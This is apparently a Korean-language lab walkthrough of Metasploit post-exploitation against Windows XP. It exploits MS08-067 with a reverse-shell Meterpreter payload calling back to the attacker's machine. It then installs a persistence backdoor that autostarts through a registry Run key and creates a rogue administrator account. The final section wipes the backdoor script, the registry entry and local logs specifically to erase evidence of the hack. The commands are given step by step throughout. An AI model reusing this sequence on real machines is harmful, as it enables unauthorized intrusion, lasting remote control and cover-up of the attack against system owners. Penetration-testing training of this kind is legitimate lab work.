# 실습과정

### 1. Persistence
Meterpreter는 Persistence를 이용하여 시스템에 BackDoor를 남기고 지속적으로 드나들 수 있는 통로를 만들 수 있다.


일단 Kali에서 root의 권한으로 CMD창을 열고  
**msfconsole** 을 입력해 msfconsole을 실행한다.  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Window%20Xp/Persistence/%EC%8B%A4%EC%8A%B51.png)

그 다음은 우리가 공격할 대상인 WindowXp의 취약점인 ms08-067을 통해 공격을 할 것이므로 이를 설정해 놓는다.  
**search ms08-067**  
**use exploit windows/smb/ms08_067_netapi**  
**set payload windows/meterpreter/reverse_tcp_allports**  
**show options**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Window%20Xp/Persistence/%EC%8B%A4%EC%8A%B52%20%EA%B8%B0%EB%B3%B8%20%EC%84%A4%EC%A0%95.png)

이후 나머지 RHOST와 LHOST를 설정한다.
**set RHOST (window XP IP)**  
**set LHOST (Kali IP)**  
**run**  
을 실행한다.
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Window%20Xp/Persistence/%EC%B9%A8%ED%88%AC%20%EC%99%84%EB%A3%8C.png)  
이렇게하면 우리는 성공적으로 window Xp에 들어올 수 있게 된다.
그다음 우리는 우리의 목표인 Persistence를 얻기위해 다음의 작업을 진행한다.  
**run persistence -h**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Persistence/Window%20Xp/Persistence%EC%98%B5%EC%85%98%EC%97%90%20%EB%8C%80%ED%95%9C%20%EC%84%A4%EB%AA%85.png)  
위의 사진에서 보다 싶이 여러 옵션을 통해 persistence를 설정할 수 있다.
우리는 아래의 명령어를 통해 시스템이 부팅이 되면 자동적으로 실행, 연결 시도 간격을 10초로 설정해서 persistence를 작업한다.  
**run persistence -A -P windows/meterpreter/reverse_tcp_allports -X -i 10 -p 5555 -r (Kali IP)**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Persistence/Window%20Xp/Persistence%EC%98%B5%EC%85%98%20%EC%84%A4%EC%A0%95.png)  
설정이 완료되었다면 다음과 같은 형상이 나타나게 된다.
결과를 보면 첫번째 [+]를 보면 공격대상에 해당경로에 Persistence Script(Back Door)가 쓰여있는 것을 볼 수 있다.

그렇다면 우리는 Window Xp에서 해당 파일이 있는지 확인해보면 다음과 같다.
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Persistence/Window%EC%97%90%20Script%ED%8C%8C%EC%9D%BC%20%EC%83%9D%EC%84%B1.png)  
실제 Window Xp의 C:\WINDOWS\TEMP의 경로에 해당파일이 생성되어있는 것을 알 수 있었다.

그리고 handler가 싷행되었고 마지막 [+]를 보면 BacckDoor가 자동적으로 실행시키기 위한 install key가 생성되었다고 나와있다.
이는 우리가 옵션으로 생성한 결과이므로 이를 Window Xp의 실제 register에서 보면 다음과 같은 결과를 볼 수 있다.
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Persistence/BackDoor%EB%A5%BC%20%EC%9C%84%ED%95%9C%20install%20key.png)  다음과 같은 파일이 설정되고 있는 것을 볼 수 있다.
또한 Kali에서 session이 맺어진것으로도 확인할 수 있다.
이 세션은 Window Xp가 종료되면 자동적으로 사라지고 실행되면 자동적으로 맺어진다.
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Persistence/Window%20Xp%EC%A2%85%EB%A3%8C%EC%8B%9C%20%EC%84%B8%EC%85%98%EC%83%81%ED%83%9C.png)  

### 2. BackDoor 계정만들기
이제 우리는 BackDoor를 할 수 있는 계정을 만든다음에 관리자의 권한을 부여해보는 연습을 해볼 것이다.
WindowXp에서 공격을 수행하고 난 이후의 시점부터 볼 것이다.  
다음의 명령어를 통해 미터프리터 세션을 열고 shell을 열어준다.  
**shell**
**net user (원하는 이름) (원하는 비밀번호) /add**  
**net user**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/BackDoor%20%EA%B3%84%EC%A0%95%EB%A7%8C%EB%93%A4%EA%B8%B0/backDoor%20%EA%B3%84%EC%A0%95%EC%83%9D%EC%84%B1.png)  
을 생성하고 이를 window Xp에서 보면 다음과 같은 결과가 나타나게 된다.  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/BackDoor%20%EA%B3%84%EC%A0%95%EB%A7%8C%EB%93%A4%EA%B8%B0/Window%EC%97%90%EC%84%9C%20%ED%99%95%EC%9D%B8.png)  
또는 Kali에서 **net user** 명령어를 통해 확인이 가능하다.  

그러나 사진에서 보다싶이 제한된 권한을 가지고 있다.  
이를 adminstorator의 권한으로 올려주기 위해 다음과 같은 작업을 한다.  
**net localgroup administrators (계정이름) /add**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/BackDoor%20%EA%B3%84%EC%A0%95%EB%A7%8C%EB%93%A4%EA%B8%B0/backDoor%20%EA%B3%84%EC%A0%95%20%EA%B6%8C%ED%95%9C%EC%83%81%EC%8A%B9.png)  
를 하고 다시 window에서 보면 다음과 같은 결과가 나타날 것이다.  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/BackDoor%20%EA%B3%84%EC%A0%95%EB%A7%8C%EB%93%A4%EA%B8%B0/Window%EC%97%90%EC%84%9C%20%EA%B6%8C%ED%95%9C%EC%83%81%EC%8A%B9%ED%99%95%EC%9D%B8.png)  

만약 계정을 삭제하고 싶다면 다음의 명령어를 이용한다.
**net user (계정이름) (계정 비밀번호) /delete**  

**exit**  
**getsystem**  
**getuid**

이 명령어를 통해 시스템 권한과 권한이 얻어진것을 확인을 하고
다음의 명령어를 통해 시스템을 재부팅해본다.  
**ps**  
**migrate (explorer.exe 필자는 492)**  
**reboot**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/BackDoor%20%EA%B3%84%EC%A0%95%EB%A7%8C%EB%93%A4%EA%B8%B0/backDoor%20%EC%83%9D%EC%84%B1%ED%9B%84%20%EC%A2%85%EB%A3%8C%20%EC%A4%80%EB%B9%84.png)  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/BackDoor%20%EA%B3%84%EC%A0%95%EB%A7%8C%EB%93%A4%EA%B8%B0/Window%20%EC%9B%90%EA%B2%A9%EC%A2%85%EB%A3%8C.png)  
를 하면 windowXp가 정상적으로 재부팅이 되는 것을 볼 수 있다.
이후 시스템을 종료하고 다시 window에서 로그인화면을 보면 2가지의 계정이 생겼을 겻이다.  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/BackDoor%20%EA%B3%84%EC%A0%95%EB%A7%8C%EB%93%A4%EA%B8%B0/WindowXp%EB%A1%9C%EA%B7%B8%EC%9D%B8%20%ED%99%94%EB%A9%B4.png)  

## 3. 흔적 제거
우리가 행한 BackDoor 공격은 해킹의 증거가 될 수 있기에 공격 컴퓨터에서 필요한 정보를 얻은 뒤에 반드시 Remove BackDoor과정을 통해 BackDoor를 제거해야한다.  
**진행과정**  
+ BackDoor Script제거
+ Registry 제거
+ Local File 정리  

### 첫번째 Script제거는 다음과 같이 한다.  
**rm "C:\WINDOWS\TEMP\OJugfnRcF.vbs"**  
**해당 경로 파일은 모두 다르므로 꼭 경로를 공격정보에서 확인하고 설정하세요.**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/%ED%9D%94%EC%A0%81%20%EC%A0%9C%EA%B1%B0/script%EC%A0%9C%EA%B1%B0.png)  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/%ED%9D%94%EC%A0%81%20%EC%A0%9C%EA%B1%B0/window%20Xp%EC%97%90%EC%84%9C%20%EC%A0%9C%EA%B1%B0%EB%90%9C%20%EC%83%81%ED%83%9C.png)

### 두번째 Registry 제거는 다음과 같이 한다.  
**reg deleteval -k "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -v "TdZlRdIIUFP"**  
**이 역시 모든 공격마다 경로가 다르니 공격정보에서 확인하고 설정하세요.**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/%ED%9D%94%EC%A0%81%20%EC%A0%9C%EA%B1%B0/%EB%A0%88%EC%A7%80%EC%8A%A4%ED%8A%B8%EB%A6%AC%20%EC%A0%9C%EA%B1%B0.png)  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/%ED%9D%94%EC%A0%81%20%EC%A0%9C%EA%B1%B0/Window%20Xp%EC%97%90%EC%84%9C%20%EB%A0%88%EC%A7%80%EC%8A%A4%ED%8A%B8%EB%A6%AC%20%EC%83%81%ED%83%9C.png)

### 세번째 로컬파일 정리
**cd /root/.msf4/logs/persistence**  
를 통해 해당 공간에 남아있는 파일을 **ls -al** 또는 **ls** (유닉스 명렁어)를 통해 확인 후  
**rm -rf ARAD4228_20220201.~**  
파일을 제거하면 마무리 됩니다.
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/%ED%9D%94%EC%A0%81%20%EC%A0%9C%EA%B1%B0/%EB%A1%9C%EC%BB%AC%20%ED%8C%8C%EC%9D%BC%EC%A0%95%EB%A6%AC.png)
